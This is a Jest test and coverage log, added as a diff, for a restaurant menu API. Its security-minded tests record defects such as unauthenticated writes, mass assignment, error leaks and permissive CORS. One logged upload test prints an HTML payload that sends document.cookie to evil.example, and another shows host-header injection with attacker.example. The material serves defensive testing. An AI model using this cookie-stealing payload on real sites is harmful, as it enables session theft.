@@ -1,0 +1,541 @@
+
+> menu-service@1.0.0 test:coverage
+> jest --coverage --runInBand
+
+  console.log
+    [BB-002] empty body returned: 500 {"error":"Restaurant validation failed: location.tag: Path `location.tag` is required., location.coordinates: Path `location.coordinates` is required., location.type: Path `location.type` is required., name: Path `name` is required., image: Path `image` is required., deliveryTime: Path `deliveryTime` is required., deliveryFee: Path `deliveryFee` is required., minOrder: Path `minOrder` is required., distance: Path `distance` is required., priceLevel: Path `priceLevel` is required., owner_id: Path `owner_id` is required."}
+
+      at tests/blackbox/restaurants.blackbox.test.ts:48:15
+
+  console.log
+    [BB-003] missing name returned: 500 {"error":"Restaurant validation failed: name: Path `name` is required."}
+
+      at tests/blackbox/restaurants.blackbox.test.ts:55:15
+
+  console.log
+    [BB-004] wrong-type name returned: 201 {"name":"123","image":"http://localhost:3001/uploads/test.png","rating":4.5,"deliveryTime":"30 min","deliveryFee":"Rs. 150","minOrder":"Rs. 500","distance":"2.5 km","cuisines":["Italian","Pizza"],"pri
+
+      at tests/blackbox/restaurants.blackbox.test.ts:61:15
+
+  console.log
+    [BB-005] long name returned: 201
+
+      at tests/blackbox/restaurants.blackbox.test.ts:68:15
+
+  console.log
+    [BB-007] negative rating returned: 201 -100
+
+      at tests/blackbox/restaurants.blackbox.test.ts:84:15
+
+  console.log
+    [BB-008] extra fields returned: 201
+
+      at tests/blackbox/restaurants.blackbox.test.ts:90:15
+
+  console.log
+    [BB-011] unknown id returned: 404 {"error":"Restaurant not found"}
+
+      at tests/blackbox/restaurants.blackbox.test.ts:113:15
+
+  console.log
+    [BB-012] invalid id returned: 500 {"error":"Cast to ObjectId failed for value \"not-an-objectid\" (type string) at path \"_id\" for model \"Restaurant\""}
+
+      at tests/blackbox/restaurants.blackbox.test.ts:119:15
+
+  console.log
+    [BB-014] update unknown returned: 404 {"error":"Restaurant not found"}
+
+      at tests/blackbox/restaurants.blackbox.test.ts:134:15
+
+  console.log
+    [BB-015] PUT changed ownership & active flag: owner_id= attacker-999 is_active= false
+
+      at tests/blackbox/restaurants.blackbox.test.ts:146:15
+
+  console.log
+    [BB-019] delete unknown returned: 404
+
+      at tests/blackbox/restaurants.blackbox.test.ts:174:15
+
+  console.log
+    [BB-023] request with invalid JWT returned: 201
+
+      at tests/blackbox/restaurants.blackbox.test.ts:208:15
+
+node.exe : FAIL tests/blackbox/restaurants.blackbox.test.ts
+At line:1 char:1
++ & "C:\Program Files\nodejs/node.exe" "C:\Program Files\nodejs/node_mo ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (FAIL tests/blac...lackbox.test.ts:String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+ 
+  BLACK-BOX /api/restaurants
+    POST /
+      ΓêÜ TC-BB-001 valid input should return 201 + created restaurant (129 ms)
+      ΓêÜ TC-BB-002 empty body -> expect 400 (defect: likely 500) (39 ms)
+      ΓêÜ TC-BB-003 missing required "name" -> expect 400 (defect: likely 500) (14 ms)
+      ├ù TC-BB-004 numeric field given as wrong type (name: 123) -> expect 400 (14 ms)
+      ΓêÜ TC-BB-005 very long name (10000 chars) is accepted (no max-length validation) (14 ms)
+      ΓêÜ TC-BB-006 special characters including HTML/script payload stored verbatim (10 ms)
+      ΓêÜ TC-BB-007 negative rating accepted (no min validation) (9 ms)
+      ΓêÜ TC-BB-008 unknown fields accepted (no schema stripping) (9 ms)
+    GET /
+      ΓêÜ TC-BB-009 returns 200 + array (24 ms)
+    GET /:restaurantId
+      ΓêÜ TC-BB-010 valid id -> 200 (21 ms)
+      ΓêÜ TC-BB-011 valid-but-unknown ObjectId -> expect 404 (10 ms)
+      ├ù TC-BB-012 invalid (non-ObjectId) id -> expect 400, defect likely 500 CastError leak (7 ms)
+    PUT /:restaurantId
+      ΓêÜ TC-BB-013 update valid -> 200 (22 ms)
+      ΓêÜ TC-BB-014 update unknown id -> expect 404 (8 ms)
+      ΓêÜ TC-BB-015 MASS ASSIGNMENT: update owner_id and is_active via generic PUT (16 ms)
+    PATCH /:restaurantId/owner
+      ΓêÜ TC-BB-016 missing owner_id -> expect 400 (10 ms)
+      ΓêÜ TC-BB-017 valid owner_id -> 200 (17 ms)
+    DELETE /:restaurantId
+      ΓêÜ TC-BB-018 delete valid -> 200 + message (18 ms)
+      ΓêÜ TC-BB-019 delete unknown id -> expect 404 (8 ms)
+    GET /:restaurantId/details
+      ΓêÜ TC-BB-020 returns categories + menuItems arrays (19 ms)
+    GET /owner/:ownerId
+      ΓêÜ TC-BB-021 returns 200 + array of a given owner (no auth required) (14 ms)
+    Un-Authenticated write access (Broken Access Control check)
+      ΓêÜ TC-BB-022 write endpoints reachable with NO Authorization header (12 ms)
+      ΓêÜ TC-BB-023 write endpoints reachable with a GARBAGE Bearer token (12 ms)
+
+  ΓùÅ BLACK-BOX /api/restaurants ΓÇ║ POST / ΓÇ║ TC-BB-004 numeric field given as wrong type (name: 123) -> expect 400
+
+    expect(received).toContain(expected) // indexOf
+
+    Expected value: 201
+    Received array: [400, 500]
+
+    [0m [90m 60 |[39m       [36mconst[39m res [33m=[39m [36mawait[39m 
+api[33m.[39mpost([32m'/api/restaurants'[39m)[33m.[39msend({ [33m...[39mvalidRestaurant[33m,[39m 
+name[33m:[39m [35m123[39m })[33m;[39m
+     [90m 61 |[39m       console[33m.[39mlog([32m'[BB-004] wrong-type name returned:'[39m[33m,[39m 
+res[33m.[39mstatus[33m,[39m 
+[33mJSON[39m[33m.[39mstringify(res[33m.[39mbody)[33m.[39mslice([35m0[39m[33m,[39m 
+[35m200[39m))[33m;[39m
+    [31m[1m>[22m[39m[90m 62 |[39m       expect([[35m400[39m[33m,[39m 
+[35m500[39m])[33m.[39mtoContain(res[33m.[39mstatus)[33m;[39m
+     [90m    |[39m                          [31m[1m^[22m[39m
+     [90m 63 |[39m     })[33m;[39m
+     [90m 64 |[39m
+     [90m 65 |[39m     it([32m'TC-BB-005 very long name (10000 chars) is accepted (no max-length 
+validation)'[39m[33m,[39m [36masync[39m () [33m=>[39m {[0m
+
+      at tests/blackbox/restaurants.blackbox.test.ts:62:26
+      at fulfilled (tests/blackbox/restaurants.blackbox.test.ts:5:58)
+
+  ΓùÅ BLACK-BOX /api/restaurants ΓÇ║ GET /:restaurantId ΓÇ║ TC-BB-012 invalid (non-ObjectId) id -> expect 400, defect 
+likely 500 CastError leak
+
+    expect(received).toBe(expected) // Object.is equality
+
+    Expected: 400
+    Received: 500
+
+    [0m [90m 118 |[39m       [36mconst[39m res [33m=[39m [36mawait[39m 
+api[33m.[39m[36mget[39m([32m'/api/restaurants/not-an-objectid'[39m)[33m;[39m
+     [90m 119 |[39m       console[33m.[39mlog([32m'[BB-012] invalid id returned:'[39m[33m,[39m 
+res[33m.[39mstatus[33m,[39m 
+[33mJSON[39m[33m.[39mstringify(res[33m.[39mbody)[33m.[39mslice([35m0[39m[33m,[39m 
+[35m300[39m))[33m;[39m
+    [31m[1m>[22m[39m[90m 120 |[39m       expect(res[33m.[39mstatus)[33m.[39mtoBe([35m400[39m)[33m;[39m
+     [90m     |[39m                          [31m[1m^[22m[39m
+     [90m 121 |[39m     })[33m;[39m
+     [90m 122 |[39m   })[33m;[39m
+     [90m 123 |[39m[0m
+
+      at tests/blackbox/restaurants.blackbox.test.ts:120:26
+      at fulfilled (tests/blackbox/restaurants.blackbox.test.ts:5:58)
+
+  console.log
+    [BB-034] string price returned: 201 {"category_id":"6ab104e252623c51bc2ad576","name":"Margherita","description":"Classic cheese","price":1200,"image_url":"http://localhost:3001/uploads/m
+
+      at tests/blackbox/menuItems.blackbox.test.ts:64:15
+
+  console.log
+    [BB-035] negative price returned: 201 {"category_id":"6ab104e252623c51bc2ad576","name":"Margherita","description":"Classic cheese","price":-500,"image_url":"http://localhost:3001/uploads/m
+
+      at tests/blackbox/menuItems.blackbox.test.ts:70:15
+
+  console.log
+    [BB-036] empty item returned: 500 {"error":"MenuItem validation failed: image_url: Path `image_url` is required., price: Path `price` is required., description: Path `description` is required., name: Path `name` is required., category
+
+      at tests/blackbox/menuItems.blackbox.test.ts:77:15
+
+  console.log
+    [BB-038] invalid category_id returned: 500 {"error":"MenuItem validation failed: category_id: Cast to ObjectId failed for value \"nope\" (type string) at path \"category_id\" because of \"BSONError\""}
+
+      at tests/blackbox/menuItems.blackbox.test.ts:94:15
+
+  console.log
+    [BB-045] mass-assign PUT returned: 200 {"_id":"6ab104e252623c51bc2ad58e","category_id":"665f00000000000000000000","name":"Margherita","description":"Classic cheese","price":1,"image_url":"http://localhost:3001/uploads/margherita.png","is_v
+
+      at tests/blackbox/menuItems.blackbox.test.ts:150:15
+
+  console.log
+    [BB-046] delete missing item returned: 404 {"error":"Menu item not found"}
+
+      at tests/blackbox/menuItems.blackbox.test.ts:158:15
+
+FAIL tests/blackbox/menuItems.blackbox.test.ts
+  BLACK-BOX /api/menu-items
+    POST /
+      ΓêÜ TC-BB-033 valid menu item -> 201 (9 ms)
+      ΓêÜ TC-BB-034 price as string "1200" is coerced to number (12 ms)
+      ΓêÜ TC-BB-035 NEGATIVE price accepted -> price tampering (no min validation) (7 ms)
+      ΓêÜ TC-BB-036 empty body -> expect 400 (defect: likely 500) (6 ms)
+      ΓêÜ TC-BB-037 XSS payload in name/description stored verbatim (5 ms)
+      ├ù TC-BB-038 non-ObjectId category_id -> expect 400 (defect: likely 500 CastError) (9 ms)
+    GET /
+      ΓêÜ TC-BB-039 returns 200 + array (21 ms)
+    GET /category/:categoryId
+      ΓêÜ TC-BB-040 valid category -> 200 + array (6 ms)
+    GET /restaurant/:restaurantId
+      ΓêÜ TC-BB-041 valid restaurant -> 200 + array (9 ms)
+    GET /:menuItemId/image
+      ΓêÜ TC-BB-042 returns image_url wrapper (17 ms)
+      ΓêÜ TC-BB-043 missing item -> expect 404 (7 ms)
+    PUT /:menuItemId
+      ΓêÜ TC-BB-044 update valid item -> 200 (14 ms)
+      ΓêÜ TC-BB-045 MASS ASSIGNMENT: PUT can change is_available, price, category_id (19 ms)
+    DELETE /:menuItemId
+      ├ù TC-BB-046 delete non-existent item -> expect 404 (defect: currently 200 with success message) (9 ms)
+      ΓêÜ TC-BB-047 delete valid item -> 200 (15 ms)
+
+  ΓùÅ BLACK-BOX /api/menu-items ΓÇ║ POST / ΓÇ║ TC-BB-038 non-ObjectId category_id -> expect 400 (defect: likely 500 
+CastError)
+
+    expect(received).toBe(expected) // Object.is equality
+
+    Expected: 400
+    Received: 500
+
+    [0m [90m 93 |[39m       [36mconst[39m res [33m=[39m [36mawait[39m 
+api[33m.[39mpost([32m'/api/menu-items'[39m)[33m.[39msend({ [33m...[39mvalidItem()[33m,[39m 
+category_id[33m:[39m [32m'nope'[39m })[33m;[39m
+     [90m 94 |[39m       console[33m.[39mlog([32m'[BB-038] invalid category_id returned:'[39m[33m,[39m 
+res[33m.[39mstatus[33m,[39m 
+[33mJSON[39m[33m.[39mstringify(res[33m.[39mbody)[33m.[39mslice([35m0[39m[33m,[39m 
+[35m250[39m))[33m;[39m
+    [31m[1m>[22m[39m[90m 95 |[39m       expect(res[33m.[39mstatus)[33m.[39mtoBe([35m400[39m)[33m;[39m
+     [90m    |[39m                          [31m[1m^[22m[39m
+     [90m 96 |[39m     })[33m;[39m
+     [90m 97 |[39m   })[33m;[39m
+     [90m 98 |[39m[0m
+
+      at tests/blackbox/menuItems.blackbox.test.ts:95:26
+      at fulfilled (tests/blackbox/menuItems.blackbox.test.ts:5:58)
+
+  ΓùÅ BLACK-BOX /api/menu-items ΓÇ║ DELETE /:menuItemId ΓÇ║ TC-BB-046 delete non-existent item -> expect 404 (defect: 
+currently 200 with success message)
+
+    Cannot set headers after they are sent to the client
+
+    [0m [90m 87 |[39m       res[33m.[39mstatus([35m500[39m)[33m.[39mjson({ error[33m:[39m 
+error[33m.[39mmessage })[33m;[39m
+     [90m 88 |[39m     } [36melse[39m {
+    [31m[1m>[22m[39m[90m 89 |[39m       res[33m.[39mstatus([35m500[39m)[33m.[39mjson({ error[33m:[39m 
+[32m'An unknown error occurred'[39m })[33m;[39m
+     [90m    |[39m                       [31m[1m^[22m[39m
+     [90m 90 |[39m     }
+     [90m 91 |[39m   }
+     [90m 92 |[39m }[33m;[39m[0m
+
+      at ServerResponse.header (node_modules/express/lib/response.js:794:10)
+      at ServerResponse.send (node_modules/express/lib/response.js:174:12)
+      at ServerResponse.json (node_modules/express/lib/response.js:278:15)
+      at json (src/controllers/menuItem.controller.ts:89:23)
+      at fulfilled (src/controllers/menuItem.controller.ts:2337:24)
+
+  console.log
+    [BB-025] empty category returned: 500 {"error":"Category validation failed: image_url: Path `image_url` is required., description: Path `description` is required., name: Path `name` is required., restaurant_id: Path `restaurant_id` is req
+
+      at tests/blackbox/categories.blackbox.test.ts:54:15
+
+  console.log
+    [BB-026] missing category name returned: 500
+
+      at tests/blackbox/categories.blackbox.test.ts:61:15
+
+  console.log
+    [BB-028] invalid category lookup returned: 500 {"error":"Cast to ObjectId failed for value \"not-an-id\" (type string) at path \"restaurant_id\" for model \"Category\""}
+
+      at tests/blackbox/categories.blackbox.test.ts:75:15
+
+  console.log
+    [BB-031] update missing category returned: 404 {"error":"Category not found"}
+
+      at tests/blackbox/categories.blackbox.test.ts:98:15
+
+  console.log
+    [BB-032] delete missing category returned: 404 {"error":"Category not found"}
+
+      at tests/blackbox/categories.blackbox.test.ts:106:15
+
+FAIL tests/blackbox/categories.blackbox.test.ts
+  BLACK-BOX /api/category
+    POST /
+      ΓêÜ TC-BB-024 valid category -> 201 (25 ms)
+      ΓêÜ TC-BB-025 empty body -> expect 400 (defect: likely 500) (10 ms)
+      ΓêÜ TC-BB-026 missing required field (name) -> expect 400 (7 ms)
+    GET /:restaurantId
+      ΓêÜ TC-BB-027 returns 200 + array for valid restaurant (23 ms)
+      ├ù TC-BB-028 invalid restaurant ObjectId -> expect 400 (defect: likely 500 CastError) (10 ms)
+    GET / (all categories)
+      ΓêÜ TC-BB-029 returns 200 + array (populates restaurant_id) (26 ms)
+    PUT /:categoryId
+      ΓêÜ TC-BB-030 update valid category -> 200 (21 ms)
+      ├ù TC-BB-031 update non-existent category -> expect 404 (defect: headers-sent bug possible) (12 ms)
+    DELETE /:categoryId
+      ├ù TC-BB-032 delete non-existent category -> expect 404 (defect: currently returns 200) (10 ms)
+
+  ΓùÅ BLACK-BOX /api/category ΓÇ║ GET /:restaurantId ΓÇ║ TC-BB-028 invalid restaurant ObjectId -> expect 400 (defect: 
+likely 500 CastError)
+
+    expect(received).toBe(expected) // Object.is equality
+
+    Expected: 400
+    Received: 500
+
+    [0m [90m 74 |[39m       [36mconst[39m res [33m=[39m [36mawait[39m 
+api[33m.[39m[36mget[39m([32m'/api/category/not-an-id'[39m)[33m;[39m
+     [90m 75 |[39m       console[33m.[39mlog([32m'[BB-028] invalid category lookup returned:'[39m[33m,[39m 
+res[33m.[39mstatus[33m,[39m 
+[33mJSON[39m[33m.[39mstringify(res[33m.[39mbody)[33m.[39mslice([35m0[39m[33m,[39m 
+[35m250[39m))[33m;[39m
+    [31m[1m>[22m[39m[90m 76 |[39m       expect(res[33m.[39mstatus)[33m.[39mtoBe([35m400[39m)[33m;[39m
+     [90m    |[39m                          [31m[1m^[22m[39m
+     [90m 77 |[39m     })[33m;[39m
+     [90m 78 |[39m   })[33m;[39m
+     [90m 79 |[39m[0m
+
+      at tests/blackbox/categories.blackbox.test.ts:76:26
+      at fulfilled (tests/blackbox/categories.blackbox.test.ts:5:58)
+
+  ΓùÅ BLACK-BOX /api/category ΓÇ║ PUT /:categoryId ΓÇ║ TC-BB-031 update non-existent category -> expect 404 (defect: 
+headers-sent bug possible)
+
+    Cannot set headers after they are sent to the client
+
+    [0m [90m 52 |[39m       res[33m.[39mstatus([35m500[39m)[33m.[39mjson({ error[33m:[39m 
+error[33m.[39mmessage })[33m;[39m
+     [90m 53 |[39m     } [36melse[39m {
+    [31m[1m>[22m[39m[90m 54 |[39m       res[33m.[39mstatus([35m500[39m)[33m.[39mjson({ error[33m:[39m 
+[32m'An unknown error occurred'[39m })[33m;[39m
+     [90m    |[39m                       [31m[1m^[22m[39m
+     [90m 55 |[39m     }
+     [90m 56 |[39m   }
+     [90m 57 |[39m }[33m;[39m[0m
+
+      at ServerResponse.header (node_modules/express/lib/response.js:794:10)
+      at ServerResponse.send (node_modules/express/lib/response.js:174:12)
+      at ServerResponse.json (node_modules/express/lib/response.js:278:15)
+      at json (src/controllers/category.controller.ts:54:23)
+      at fulfilled (src/controllers/category.controller.ts:1669:24)
+
+  ΓùÅ BLACK-BOX /api/category ΓÇ║ DELETE /:categoryId ΓÇ║ TC-BB-032 delete non-existent category -> expect 404 
+(defect: currently returns 200)
+
+    Cannot set headers after they are sent to the client
+
+    [0m [90m 72 |[39m       res[33m.[39mstatus([35m500[39m)[33m.[39mjson({ error[33m:[39m 
+error[33m.[39mmessage })[33m;[39m
+     [90m 73 |[39m     } [36melse[39m {
+    [31m[1m>[22m[39m[90m 74 |[39m       res[33m.[39mstatus([35m500[39m)[33m.[39mjson({ error[33m:[39m 
+[32m'An unknown error occurred'[39m })[33m;[39m
+     [90m    |[39m                       [31m[1m^[22m[39m
+     [90m 75 |[39m     }
+     [90m 76 |[39m   }
+     [90m 77 |[39m }[33m;[39m[0m
+
+      at ServerResponse.header (node_modules/express/lib/response.js:794:10)
+      at ServerResponse.send (node_modules/express/lib/response.js:174:12)
+      at ServerResponse.json (node_modules/express/lib/response.js:278:15)
+      at json (src/controllers/category.controller.ts:74:23)
+      at fulfilled (src/controllers/category.controller.ts:1669:24)
+
+  console.log
+    [WB-053] malformed JSON -> 400 {"error":"Unterminated string in JSON at position 13 (line 1 column 14)"}
+
+      at tests/whitebox/upload.whitebox.test.ts:78:13
+
+PASS tests/whitebox/upload.whitebox.test.ts
+  WHITE-BOX /api/upload (multer)
+    ΓêÜ WB-047 valid upload passes fileFilter & diskStorage -> 201 (33 ms)
+    ΓêÜ WB-048 fileFilter rejects disallowed extension (multipart error -> global handler 400) (11 ms)
+    ΓêÜ WB-049 fileFilter checks extension only, not magic bytes or MIME (15 ms)
+    ΓêÜ WB-050 fileSize limit 2MB enforced (multer LIMIT_FILE_SIZE -> 400) (29 ms)
+    ΓêÜ WB-051 no file -> "No file uploaded" branch (6 ms)
+    ΓêÜ WB-052 upload directory is created lazily if missing (1 ms)
+  WHITE-BOX global error handler
+    ΓêÜ WB-053 handler returns err.message as 400 (verbose leak for other error types) (20 ms)
+
+  console.log
+    [WB-044] handler attempted status codes: [404,200]
+
+      at tests/whitebox/controllers.whitebox.test.ts:147:13
+
+  console.log
+    [WB-045] handler attempted status codes: [404,200]
+
+      at tests/whitebox/controllers.whitebox.test.ts:162:13
+
+PASS tests/whitebox/controllers.whitebox.test.ts
+  WHITE-BOX restaurant.controller error branches
+    ΓêÜ WB-032 createRestaurant catch branch (DB failure) -> 500 with message (20 ms)
+    ΓêÜ WB-033 createRestaurant catch branch (non-Error thrown) -> 500 generic (7 ms)
+    ΓêÜ WB-034 updateRestaurant catch branch -> 500 (28 ms)
+    ΓêÜ WB-035 getRestaurantWithCategoriesAndMenuItems catch branch -> 500 (12 ms)
+    ΓêÜ WB-036 getRestaurantsByOwnerId catch returns generic 500 (no message leak) (8 ms)
+  WHITE-BOX menuItem.controller error branches
+    ΓêÜ WB-037 createMenuItem parseFloat coercion converts string price (13 ms)
+    ΓêÜ WB-038 createMenuItem catch branch -> 500 (12 ms)
+    ΓêÜ WB-039 updateMenuItem catch branch -> 500 (16 ms)
+    ΓêÜ WB-040 deleteMenuItem catch branch -> 500 (5 ms)
+    ΓêÜ WB-041 getMenuItemImage not-found branch -> 404 (6 ms)
+    ΓêÜ WB-042 getMenuItemImage catch branch -> 500 (8 ms)
+  WHITE-BOX category.controller branches (incl. double-response defect)
+    ΓêÜ WB-043 createCategory catch branch -> 500 (8 ms)
+    ΓêÜ WB-044 updateCategory when NOT found -> double response bug (404 then 200 attempted) (11 ms)
+    ΓêÜ WB-045 deleteCategory when NOT found -> double response bug (404 then 200 attempted) (2 ms)
+    ΓêÜ WB-046 deleteCategory catch branch -> 500 (9 ms)
+
+PASS tests/whitebox/menuItem.category.service.whitebox.test.ts
+  WHITE-BOX menuItem.service
+    ΓêÜ WB-014 createMenuItem persists document (6 ms)
+    ΓêÜ WB-015 getMenuItemsByCategory returns available items only (30 ms)
+    ΓêÜ WB-016 updateMenuItem applies $set and returns new doc (10 ms)
+    ΓêÜ WB-017 deleteMenuItem removes doc (10 ms)
+    ΓêÜ WB-018 getMenuItemsByRestaurant joins via category ids (9 ms)
+    ΓêÜ WB-019 getAllMenuItems populates category_id (11 ms)
+    ΓêÜ WB-020 getMenuItemImage returns { image_url } only (6 ms)
+    ΓêÜ WB-021 getMenuItemImage null for missing doc (3 ms)
+    ΓêÜ WB-022 DB failure branch: createMenuItem propagates (15 ms)
+    ΓêÜ WB-023 DB failure branch: getMenuItemImage propagates (1 ms)
+    ΓêÜ WB-024 empty category list -> getMenuItemsByRestaurant returns [] (5 ms)
+  WHITE-BOX category.service
+    ΓêÜ WB-025 createCategory persists (4 ms)
+    ΓêÜ WB-026 getCategoriesByRestaurant returns active categories (11 ms)
+    ΓêÜ WB-027 updateCategory applies $set (6 ms)
+    ΓêÜ WB-028 deleteCategory removes doc (5 ms)
+    ΓêÜ WB-029 populate on getAllCategories (restaurant_id populated) (9 ms)
+    ΓêÜ WB-030 DB failure branch: getCategoriesByRestaurant propagates (2 ms)
+    ΓêÜ WB-031 DB failure branch: updateCategory propagates (1 ms)
+
+PASS tests/whitebox/restaurant.service.whitebox.test.ts
+  WHITE-BOX restaurant.service
+    ΓêÜ WB-001 createRestaurant persists a document (108 ms)
+    ΓêÜ WB-002 getRestaurants returns only active restaurants (12 ms)
+    ΓêÜ WB-003 updateRestaurant uses $set with provided data (5 ms)
+    ΓêÜ WB-004 deleteRestaurant removes the document (6 ms)
+    ΓêÜ WB-005 getRestaurantById resolves document (4 ms)
+    ΓêÜ WB-006 getRestaurantById throws CastError for invalid ObjectId (2 ms)
+    ΓêÜ WB-007 getRestaurantById(null) resolves null (2 ms)
+    ΓêÜ WB-008 getRestaurantWithCategoriesAndMenuItems returns {categories, menuItems} (11 ms)
+    ΓêÜ WB-009 getRestaurantsByOwnerId filters by owner_id (5 ms)
+    ΓêÜ WB-010 DB failure branch: createRestaurant propagates error (7 ms)
+    ΓêÜ WB-011 DB failure branch: getRestaurants propagates error (2 ms)
+    ΓêÜ WB-012 DB failure branch: updateRestaurant propagates error (1 ms)
+    ΓêÜ WB-013 DB failure branch: getRestaurantsByOwnerId propagates error (2 ms)
+
+  console.log
+    [SEC-001] headers: {"x-powered-by":"Express","access-control-allow-origin":"*","content-type":"application/json; charset=utf-8","content-length":"2","etag":"W/\"2-l9Fw4VUO7kr8CvBlt4zaMCqXZ0w\"","date":"Mon, 21 Sep 2026 10:20:22 GMT","connection":"close"}
+
+      at tests/whitebox/security.observation.whitebox.test.ts:22:13
+
+  console.log
+    [SEC-002] access-control-allow-origin: *
+
+      at tests/whitebox/security.observation.whitebox.test.ts:31:13
+
+  console.log
+    [SEC-004] app.ts line 11 uses express.json() with default settings
+
+      at tests/whitebox/security.observation.whitebox.test.ts:43:13
+
+  console.log
+    [SEC-005] uploads response headers: {"x-powered-by":"Express","access-control-allow-origin":"*","content-security-policy":"default-src 'none'","x-content-type-options":"nosniff","content-type":"text/html; charset=utf-8","content-length":"159","date":"Mon, 21 Sep 2026 10:20:22 GMT","connection":"close"}
+
+      at tests/whitebox/security.observation.whitebox.test.ts:49:13
+
+PASS tests/whitebox/security.observation.whitebox.test.ts
+  SECURITY OBSERVATIONS - menu-service configuration
+    ΓêÜ SEC-001 no security headers sent (no helmet): X-Content-Type-Options etc. absent (26 ms)
+    ΓêÜ SEC-002 CORS reflects ANY origin (permissive cors()) (12 ms)
+    ΓêÜ SEC-003 no rate-limit headers present (no express-rate-limit) (13 ms)
+    ΓêÜ SEC-004 express.json uses default 100kb limit (no explicit cap) (3 ms)
+    ΓêÜ SEC-005 static /uploads served without CSP/nosniff (content sniffing risk) (9 ms)
+
+  console.log
+    [BB-049] html upload returned: 400 {"error":"Only image files are allowed (png, jpg, jpeg, gif, webp)"}
+
+      at tests/blackbox/upload.blackbox.test.ts:47:13
+
+  console.log
+    [BB-051] oversize upload returned: 400 {"error":"File too large"}
+
+      at tests/blackbox/upload.blackbox.test.ts:60:13
+
+  console.log
+    [BB-052] html-in-png accepted: 201 {"url":"http://127.0.0.1:50401/uploads/1789986023396-19631820.png","filename":"1789986023396-19631820.png"}
+
+      at tests/blackbox/upload.blackbox.test.ts:66:13
+
+  console.log
+    [BB-052] stored file content (first 80 bytes): <html><body><script>document.location="http://evil.example/?c="+document.cookie<
+
+      at tests/blackbox/upload.blackbox.test.ts:72:17
+
+  console.log
+    [BB-053] traversal filename returned: 201 {"url":"http://127.0.0.1:50403/uploads/1789986023408-5269277.png","filename":"1789986023408-5269277.png"}
+
+      at tests/blackbox/upload.blackbox.test.ts:80:13
+
+  console.log
+    [BB-054] returned url: http://attacker.example/uploads/1789986023418-316626708.png
+
+      at tests/blackbox/upload.blackbox.test.ts:93:13
+
+PASS tests/blackbox/upload.blackbox.test.ts
+  BLACK-BOX /api/upload
+    ΓêÜ TC-BB-048 valid PNG upload -> 201 with url (21 ms)
+    ΓêÜ TC-BB-049 disallowed extension (.html) -> reject (400) (11 ms)
+    ΓêÜ TC-BB-050 NO file -> 400 (5 ms)
+    ΓêÜ TC-BB-051 oversized file (>2MB) -> expect 400 (multer limit) (222 ms)
+    ΓêÜ TC-BB-052 HTML payload smuggled with image extension (content-type spoof) is ACCEPTED (9 ms)
+    ΓêÜ TC-BB-053 traversal-style client filename is neutralised (random server name used) (11 ms)
+    ΓêÜ TC-BB-054 Host header is reflected into returned URL (host header injection) (11 ms)
+
+---------------------------|---------|----------|---------|---------|----------------------------------------
+File                       | % Stmts | % Branch | % Funcs | % Lines | Uncovered Line #s                      
+---------------------------|---------|----------|---------|---------|----------------------------------------
+All files                  |   90.42 |    54.83 |   98.82 |   88.53 |                                        
+ src                       |     100 |       50 |     100 |     100 |                                        
+  app.ts                   |     100 |       50 |     100 |     100 | 21                                     
+ src/controllers           |   85.34 |    51.85 |     100 |   82.38 |                                        
+  category.controller.ts   |   88.67 |    58.33 |     100 |   86.04 | 19,33,52,85-88                         
+  menuItem.controller.ts   |   83.13 |    52.17 |     100 |   79.71 | 25,38-41,60-61,69,102-105,116-119,144  
+  restaurant.controller.ts |   85.41 |    47.36 |     100 |   82.71 | 50-53,75,95-96,101-104,122-125,146,167 
+ src/models                |     100 |      100 |     100 |     100 |                                        
+  category.model.ts        |     100 |      100 |     100 |     100 |                                        
+  menuItem.model.ts        |     100 |      100 |     100 |     100 |                                        
+  restaurant.model.ts      |     100 |      100 |     100 |     100 |                                        
+ src/routes                |    98.3 |       75 |     100 |    98.3 |                                        
+  category.routes.ts       |     100 |      100 |     100 |     100 |                                        
+  menuItem.routes.ts       |     100 |      100 |     100 |     100 |                                        
+  restaurant.routes.ts     |     100 |      100 |     100 |     100 |                                        
+  upload.routes.ts         |   96.29 |       75 |     100 |   96.29 | 10                                     
+ src/services              |   94.49 |      100 |    97.5 |   92.75 |                                        
+  category.service.ts      |   95.83 |      100 |     100 |   92.85 | 32                                     
+  menuItem.service.ts      |   93.33 |      100 |     100 |      90 | 15,46,58                               
+  restaurant.service.ts    |      95 |      100 |   93.33 |      96 | 50                                     
+---------------------------|---------|----------|---------|---------|----------------------------------------
+Test Suites: 3 failed, 6 passed, 9 total
+Tests:       7 failed, 105 passed, 112 total
+Snapshots:   0 total
+Time:        12.503 s
+Ran all test suites.
